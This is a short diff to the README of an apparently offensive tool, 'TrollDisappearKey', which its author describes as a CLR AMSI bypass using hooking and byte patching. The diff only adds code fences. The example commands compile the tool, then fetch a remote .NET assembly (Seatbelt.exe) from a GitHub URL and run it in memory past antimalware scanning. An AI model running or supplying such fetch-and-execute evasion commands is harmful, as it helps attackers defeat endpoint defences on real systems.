@@ -14,11 +14,15 @@ concept is hooking / byte patching so nothing much really.
 This works specifically for clr bypass not powershell. It used to work for powershell >1 year ago but something updated and it broke. 
   
 ## Usage 
+```
 TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
+```
 
 ## Example
+```
 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:TrollDisappearKey.exe TrollDisappearKey.cs
 TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
+```
 
 ## Features
 Nothing actually, its quite barebone with short code profile so anyone can tweak it to their needs  (e.g tweak the code to load .dll assemblies instead of just .exe assemblies)
